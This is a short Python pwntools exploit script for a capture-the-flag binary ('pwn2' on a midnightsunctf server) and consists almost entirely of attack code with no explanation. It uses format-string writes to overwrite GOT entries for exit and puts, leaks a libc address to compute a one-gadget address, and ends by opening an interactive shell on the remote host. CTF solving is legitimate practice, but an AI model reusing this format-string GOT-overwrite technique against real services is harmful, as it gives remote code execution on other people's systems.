from pwn import *

#io = process('./pwn2',env={'LD_PRELOAD':'./libc.so.6'})

io = remote('pwn2-01.play.midnightsunctf.se' ,'10002')
#gdb.attach(io,'b*0x8048688')

main = 0x08048655
exit = 0x0804b020
puts = 0x0804b01c

def pad(s):
        return s+"X"*(64-len(s))

payload = ''
payload += p32(exit)
payload += "%{}d".format(0x8655-0x4)
payload += "%7$hn"
payload = pad(payload)
io.sendlineafter(': ',payload)

payload = "%37$p"
io.sendline(payload)

io.recvuntil(': ')
io.recvline()

io.recvuntil(': ')
leak = io.recvline()
sys = int(leak,16)+0x23e8f
libc_base=sys-0x3cd10
print hex(libc_base)
sys=hex(sys)
gadget=libc_base+0x13573f
gadget=hex(gadget)

payload = ""
payload += p32(puts)
payload += p32(puts+2)
payload += "%{}d".format(int(gadget[-4::],16)-0xc)
payload += "%23$hn"
payload += "%{}d".format(int(gadget[-6:-4],16)-0x10)
payload += "%24$hhn"
payload = pad(payload)

io.sendlineafter(': ',payload)



io.interactive()
